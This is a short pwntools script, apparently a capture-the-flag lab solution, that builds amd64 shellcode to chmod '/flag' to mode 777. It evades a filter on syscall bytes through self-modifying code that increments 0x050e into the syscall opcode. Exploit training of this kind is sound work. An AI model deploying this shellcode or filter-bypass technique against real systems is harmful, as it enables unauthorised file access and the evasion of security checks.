from pwn import *
#context.binary = "/challenge/babyshell_level6"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["tmux", "splitw", "-h"]
#p = process()
#gdb.attach(p)
payload = asm(
"""
mov ebx, 0x67616c66
shl rbx, 0x8
mov bl, 0x2f
push rbx
mov rdi, rsp
mov rsi, 0x1ff
mov rax, 0x5a
""")
#payload += asm("nop")*4096
syscall = asm(
"""
inc word ptr [rip]
.word 0x050e
"""
)
payload += syscall
log.info("Length of shellcode: %s", len(payload))
#p.sendline(payload)
#p.interactive()                       
